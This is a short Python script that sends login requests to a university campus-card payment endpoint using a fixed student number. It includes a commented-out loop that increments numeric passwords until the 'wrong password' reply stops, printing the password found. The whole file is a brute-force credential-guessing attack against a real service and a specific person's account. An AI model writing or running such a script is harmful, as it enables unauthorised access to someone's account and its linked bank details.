import requests


def req(tempPwd):
    res = requests.post(
        url='https://ykt.hzau.edu.cn/Alipay/QueryBindBank',
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data={"inSnos": "105990005578",
              "inPasswds": tempPwd,
              "json": "true"})
    return res.text


Pwd = 666666
print(req(Pwd))

# while True:
#     x = req(Pwd)
#
#     if '密码错误' not in x:
#         print("找到密码:{}".format(Pwd))
#         break
#     print(Pwd)
#     Pwd += 1
